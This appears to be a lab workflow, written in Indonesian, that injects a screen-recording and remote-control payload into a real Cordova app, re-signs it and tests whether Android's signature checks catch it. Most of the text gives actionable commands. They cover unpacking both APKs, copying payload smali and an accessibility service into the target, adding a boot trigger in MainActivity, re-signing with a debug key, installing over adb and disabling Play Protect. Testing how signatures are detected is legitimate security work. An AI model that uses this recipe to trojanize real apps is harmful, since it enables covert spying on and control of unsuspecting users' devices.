@@ -1,0 +1,88 @@
+=== APK INJECTION & SIGN DETECTION — FULL WORKFLOW ===
+
+Payload: GabutPoC (screen recording + remote control via WebRTC)
+Target: GOL APK (com.kpk.gol, Cordova/Ionic + Firebase, v2.1.1)
+Server SRS + relay + dashboard sudah berjalan di 10.103.105.79.
+
+== PRASYARAT ==
+- apktool (unpack/repack APK)
+- jadx (decompile APK)
+- apksigner + keytool (signing & cert check)
+- adb (install ke device)
+- Docker Desktop (server)
+- GabutPoC APK: ../Lab-1/android/app/build/outputs/apk/debug/
+- GOL APK: com.kpk.gol.apk (base APK utama)
+
+== FASE 1: ANALISIS TARGET ==
+- Ekstrak XAPK: .\tools\extract-apk.ps1 -XapkPath com.kpk.gol.xapk
+- Decompile: jadx-gui com.kpk.gol.apk
+- Struktur: MainActivity extends CordovaActivity, minSdk=23, targetSdk=35
+- assets/www/ berisi Ionic/Quasar SPA (index.html, vendor.js, app.js)
+- Firebase services: Auth, Firestore, FCM, Analytics, Crashlytics
+
+== FASE 2: BUILD PAYLOAD ==
+cd ../Lab-1/android && gradlew.bat assembleDebug
+Pakai app-x86_64-debug.apk (emulator) atau app-universal-debug.apk (semua device)
+
+== FASE 3: UNPACK ==
+apktool d com.kpk.gol.apk -o gol_unpacked -f
+apktool d app-x86_64-debug.apk -o gabutpoc_unpacked -f
+
+== FASE 4: INTEGRASI ==
+A. Copy smali:
+   cp -r gabutpoc_unpacked/smali/com/example/screenwhip gol_unpacked/smali/
+   cp gabutpoc_unpacked/smali/org/webrtc/ForcedH264Encoder* gol_unpacked/smali/org/webrtc/
+B. Copy resource:
+   cp gabutpoc_unpacked/res/xml/accessibility_service_config.xml gol_unpacked/res/xml/
+C. AndroidManifest.xml: tambah 4 permission + 2 service + 1 receiver + meta-data
+D. Trigger di MainActivity smali: panggil BootReceiver.scheduleStart() di onCreate
+
+== FASE 5: REPACKAGE & SIGN ==
+apktool b gol_unpacked -o gol_modified.apk
+apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --key-pass pass:android gol_modified.apk
+apksigner verify --verbose gol_modified.apk
+
+== FASE 6: TEST SIGN DETECTION ==
+Auto (recommended):
+  .\tools\sign-check.ps1 -OriginalApk com.kpk.gol.apk -ModifiedApk gol_modified.apk -Compare -InstallTest
+
+Manual:
+  1. keytool -printcert -jarfile com.kpk.gol.apk | findstr "Owner:"  → CN=KPK/...
+  2. keytool -printcert -jarfile gol_modified.apk | findstr "Owner:" → CN=Android Debug
+  3. adb install com.kpk.gol.apk → Success
+  4. adb install -r gol_modified.apk → INSTALL_FAILED_UPDATE_INCOMPATIBLE (SIGNATURE DETECTED)
+  5. adb uninstall com.kpk.gol
+  6. adb install gol_modified.apk → Success (debug sign)
+
+== HASIL ==
+| Test | Expected |
+|------|----------|
+| Install GOL asli | Success |
+| Modified over asli | INSTALL_FAILED_UPDATE_INCOMPATIBLE |
+| Modified fresh | Success (debug sign) |
+| Play Protect | Flag spyware |
+| Play Integrity | Failed |
+
+== TROUBLESHOOT ==
+| Masalah | Solusi |
+|---------|--------|
+| INSTALL_FAILED_NO_MATCHING_ABIS | Gabung native libs (.so) dari GabutPoC |
+| INSTALL_FAILED_UPDATE_INCOMPATIBLE | Uninstall dulu APK asli |
+| Play Protect blokir | Settings → Google → Play Protect → matikan scan |
+| App crash | adb logcat -s AndroidRuntime, periksa kelas/service tidak ditemukan |
+| apktool error repackage | Cek sintaks AndroidManifest.xml, resource path |
+
+== KESIMPULAN ==
+1. Signature asli APK TIDAK BISA dipertahankan saat APK dimodifikasi (repackage)
+2. Android akan menolak update jika signature berbeda → INSTALL_FAILED_UPDATE_INCOMPATIBLE
+3. Play Protect mendeteksi screen capture + accessibility sebagai spyware
+4. Debug sign bisa di-install di device developer (fresh install, bukan update)
+5. Tanpa root/MDM, tidak bisa bypass signature check untuk update over app resmi
+
+== REFERENSI ==
+- docs/GabutPoC.md — arsitektur lengkap payload
+- docs/GOL-APK.md — analisis target
+- docs/injection.md — teknik injeksi detail (3 metode)
+- tools/sign-check.ps1 — script auto sign detection test
+- skills/apk-inject.yaml — skill YAML injeksi
+- skills/sign-check.yaml — skill YAML pengecekan
